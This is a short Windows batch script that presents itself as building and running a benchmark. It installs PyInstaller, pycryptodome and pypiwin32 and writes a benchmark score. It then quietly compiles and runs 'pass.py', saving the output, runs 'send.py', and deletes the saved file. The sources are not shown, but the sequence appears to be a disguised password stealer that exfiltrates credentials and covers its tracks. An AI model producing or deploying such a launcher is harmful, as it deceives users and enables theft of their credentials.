cd /D "%~dp0"
get-pip.exe
pip install pyinstaller
pip3 install pycryptodome pypiwin32

pyinstaller --onefile bench.py
cd dist
del /f benchmark-score.txt		
bench.exe > benchmark-score.txt		

cd..
cd random-extra-stuff
pyinstaller --onefile pass.py
timeout 1

cd dist
del /f rm.txt				
pass.exe > rm.txt

cd..
rm -r dist

pyinstaller --onefile send.py
timeout 1

cd dist			
send.exe				
timeout 1

cd..
rm rm.txt				
